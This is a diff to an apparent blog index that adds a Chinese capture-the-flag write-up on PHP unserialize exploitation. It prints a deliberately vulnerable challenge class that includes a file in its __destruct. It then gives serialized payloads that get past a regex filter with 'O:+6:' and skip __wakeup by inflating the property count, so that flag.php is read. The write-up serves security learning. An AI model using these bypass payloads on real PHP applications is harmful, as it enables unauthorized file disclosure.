@@ -7666,7 +7666,47 @@ API网关的权限检查
   <entry>
     <title>2026-3-15-反序列化漏洞利用</title>
     <url>/2026/03/15/2026-3-15-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h3 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h3><p>主要函数</p>
+<ul>
+<li>serialize 序列化函数</li>
+<li>unserialize 反序列化</li>
+</ul>
+<p>原理：</p>
+<p>1.用户输入可以传入到unserialize</p>
+<p>2.存在可利用的函数</p>
+<p>3.有危险的魔术方法</p>
+<p>4.构造POP链达到漏洞利用</p>
+<p>例：</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$flag</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;flag: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;sorry, flag not found&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;fakeflag.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>)) <span class="keyword">echo</span> <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//secret in flag.php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line">	<span class="variable">$a</span> -&gt;<span class="title function_ invoke__">__destruct</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>1.先过正则</p>
+<p>2.跳过__walkeup</p>
+<p>3.执行__destruct()</p>
+<ul>
+<li><p>O%3A6%3A”secret”%3A1%3A{s%3A4%3A”file”%3Bs%3A8%3A”flag.php”%3B} </p>
+</li>
+<li><p>O:6:”secret”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+</li>
+</ul>
+<p>被正则过滤Are you daydreaming?</p>
+<ul>
+<li><p>O:+6:”secret”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+</li>
+<li><p>O%3A%2B6%3A”secret”%3A1%3A{s%3A4%3A”file”%3Bs%3A8%3A”flag.php”%3B}</p>
+</li>
+</ul>
+<p>flag: fakeflag!</p>
+<p>没有绕过</p>
+<p>__wakeup()</p>
+<ul>
+<li>O:+6:”secret”:2:{s:4:”file”;s:8:”flag.php”;}</li>
+</ul>
+<p>URL编码后成功拿到flag</p>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>PHP</tag>
+      </tags>
   </entry>
   <entry>
     <title>2026-3-14-PHP伪协议利用</title>
